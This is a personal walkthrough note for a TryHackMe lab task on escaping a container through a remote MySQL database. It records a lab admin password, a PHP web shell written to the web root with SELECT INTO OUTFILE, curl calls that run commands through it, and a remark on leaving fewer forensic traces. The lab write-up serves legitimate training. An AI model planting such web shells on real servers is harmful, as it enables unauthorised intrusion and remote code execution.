Now that you have identified that you are in a container and have performed all the information gathering and situational awareness you can, you can escape the container by exploiting the remote database.  

There are several ways to escape a container, all typically stemming from misconfigurations of the container from services or access controls.  

For more information about container best practices and docker security, check out this OWASP cheat-sheet, [https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html).  

A method that's not quite as common is Exploitation. Exploits to escape Containers aren't as common and typically rely on abusing a process running on the host machine. Exploits usually require some level of user interaction, for example, [CVE-2019-14271](https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/). It can also be beneficial to use a container enumeration script such as DEEPCE, [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce).  

Since we gained access to a remote database, we can utilize it to gain command execution and escape the container from MySQL.  

The basic methodology for exploiting MySQL can be found below.  

- Access the remote database using administrator credentials
    
- Create a new table in the main database
    
- Inject PHP code to gain command execution
    
    Example code: `<?php $cmd=$_GET["cmd"];system($cmd);?>`  
    
- Drop table contents onto a file the user can access  
    
- Execute and obtain RCE on the host.
    

Looking at the above exploit may seem complicated, but we can break it down further and provide more context to make it simpler.  

We can use a single command to inject our PHP code into a table and save the table into a file on the remote system. We are writing any code that we want onto the remote system from this command, which we can then execute, giving use code execution. Find the command used below.  

Command used: `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`

Now that we have a file that we control dropped on the system, we can curl the address and obtain RCE from the dropped file. Find example usage below.  

Example usage: `curl 192.168.100.1:8080/shell.php?cmd=whoami`

---
# Your job

## Break out the container

The key to breaking out here is the fact we have access to that DB. The access we have permits us to write to the database, then we can call our written table enteries.
The following commands are run on the victim machine.
### Access the remote database using administrator credentials

`mysql -u admin -p -h 192.168.100.1`

Password: `!123SecureAdminDashboard321!`

### Inject our PHP code into a table and save the table into a file on the remote system

`select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`


### Accessing 192.168.100.1 machine

- Execute and obtain RCE on the host.
	You can’t view the website via a browser, as you still don’t have a proxy through this box and you only have command line access. So instead you need to use `curl`.
	
	www-data@f988aa7b2fb3:/var/www/html$ `curl 192.168.100.1:8080/shell.php?cmd=whoami`
	
	![[Task 18 - Making Thin Lizzy Proud-20240917142609190.webp]]

- Check that you are talking to a different machine.
	www-data@f988aa7b2fb3:/var/www/html$ `hostname`
	![[Task 18 - Making Thin Lizzy Proud-20240917143015435.webp]]
	
	www-data@69cd1465ecc9:/var/www/admin$ `curl 192.168.100.1:8080/shell.php?cmd=hostname`
	![[Task 18 - Making Thin Lizzy Proud-20240917143142963.webp]]


> [!INFO]
> It should be noted, that the one liner provided by TryHackMe is actually a much better solution as it doesn’t write anything to the database, and therefore will be less logs and if the outfile is removed at the end of the engagement, any forensics might be slightly more difficult (although the command should still show in the MySQL logs!)
>  How does that one liner work? Well basically it just skips writing anything to the table, instead it selects the PHP code and directs it straight into a file.

**Next step:** [[Task 19 - Going%20out%20with%20a%20SHEBANG%21]]
